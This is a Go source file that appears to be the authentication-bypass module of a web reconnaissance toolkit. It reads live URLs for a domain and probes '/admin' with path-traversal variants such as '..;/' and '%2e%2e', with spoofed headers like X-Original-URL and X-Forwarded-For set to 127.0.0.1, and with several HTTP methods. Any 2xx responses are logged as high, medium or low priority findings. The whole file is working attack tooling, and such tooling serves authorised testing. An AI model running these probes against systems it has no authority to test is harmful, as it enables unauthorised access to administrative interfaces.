package auth

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var bypassPaths = []string{
	"/admin",
	"/admin/",
	"/admin..;/",
	"/admin/%2e%2e/",
	"/admin/..%2f",
	"/public/../admin",
}

var headersList = []map[string]string{
	{"X-Original-URL": "/admin"},
	{"X-Forwarded-For": "127.0.0.1"},
	{"X-Originating-IP": "127.0.0.1"},
	{"X-Client-IP": "127.0.0.1"},
	{"X-Remote-IP": "127.0.0.1"},
	{"X-Rewrite-URL": "/admin"},
	{"X-Custom-IP-Authorization": "127.0.0.1"},
	{"X-Forwarded-Host": "127.0.0.1"},
	{"X-Host": "127.0.0.1"},
}

var methods = []string{"GET", "POST", "PUT", "HEAD", "OPTIONS"}

func RunAuthBypassScan(domain string) {
	liveFile := fmt.Sprintf("output/%s/%s_live.txt", domain, domain)
	RunAuthBypassFromFile(domain, liveFile)
}

func RunAuthBypassFromFile(domain string, liveFile string) {
	fmt.Printf("[*] [authbypass] Scanning for authentication bypasses on: %s\n", domain)

	urls, err := parseLiveFile(liveFile)
	if err != nil {
		fmt.Println("[!] Error reading live file:", err)
		return
	}

	high := make(map[string]struct{})
	medium := make(map[string]struct{})
	low := make(map[string]struct{})

	var resultsMutex sync.Mutex
	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup

	for _, baseURL := range urls {
		for _, path := range bypassPaths {
			fullURL := strings.TrimRight(baseURL, "/") + path

			for _, headers := range headersList {
				wg.Add(1)
				sem <- struct{}{}

				go func(url string, hdr map[string]string) {
					defer wg.Done()
					defer func() { <-sem }()
					doRequestAndStore(url, "GET", hdr, &high, &medium, &low, &resultsMutex)
				}(fullURL, headers)
			}

			for _, method := range methods {
				if method == "GET" {
					continue
				}
				wg.Add(1)
				sem <- struct{}{}

				go func(url, method string) {
					defer wg.Done()
					defer func() { <-sem }()
					doRequestAndStore(url, method, nil, &high, &medium, &low, &resultsMutex)
				}(fullURL, method)
			}
		}
	}

	wg.Wait()
	writeResultsByPriority(domain, high, medium, low)
}

func doRequestAndStore(url, method string, headers map[string]string, high, medium, low *map[string]struct{}, mutex *sync.Mutex) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	status := resp.StatusCode
	fmt.Printf("[*] Testings: %s [%d]%s\n", url, status, formatHeaderSnippet(headers))

	if status >= 200 && status < 300 {
		entry := fmt.Sprintf("[+] %s [%d] %s", url, status, formatHeaderSnippet(headers))
		mutex.Lock()
		if strings.Contains(url, "..%2f") || strings.Contains(url, "%2e%2e") || strings.Contains(url, "..;/") {
			(*high)[entry] = struct{}{}
		} else if len(headers) > 0 {
			(*medium)[entry] = struct{}{}
		} else {
			(*low)[entry] = struct{}{}
		}
		mutex.Unlock()
	}
}

func writeResultsByPriority(domain string, high, medium, low map[string]struct{}) {
	outPath := fmt.Sprintf("output/%s/%s_vulns/auth_bypass.txt", domain, domain)
	os.MkdirAll(fmt.Sprintf("output/%s/%s_vulns", domain, domain), os.ModePerm)
	file, err := os.Create(outPath)
	if err != nil {
		fmt.Printf("[!] Error creating output file: %v\n", err)
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	if len(high) > 0 {
		writer.WriteString("===== High Priority =====\n")
		for line := range high {
			writer.WriteString(line + "\n")
		}
		writer.WriteString("\n")
	}
	if len(medium) > 0 {
		writer.WriteString("===== Medium Priority =====\n")
		for line := range medium {
			writer.WriteString(line + "\n")
		}
		writer.WriteString("\n")
	}
	if len(low) > 0 {
		writer.WriteString("===== Low Priority =====\n")
		for line := range low {
			writer.WriteString(line + "\n")
		}
		writer.WriteString("\n")
	}
	writer.Flush()
	fmt.Printf("[+] Results saved to: %s\n", outPath)
}

func formatHeaderSnippet(headers map[string]string) string {
	if headers == nil || len(headers) == 0 {
		return ""
	}
	var parts []string
	for k, v := range headers {
		parts = append(parts, fmt.Sprintf("%s: %s", k, v))
	}
	return fmt.Sprintf(" with headers: %s", strings.Join(parts, ", "))
}

func parseLiveFile(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "http") {
			spaceIdx := strings.Index(line, " ")
			if spaceIdx != -1 {
				line = strings.TrimSpace(line[:spaceIdx])
			}
			urls = append(urls, line)
		}
	}
	return urls, scanner.Err()
}
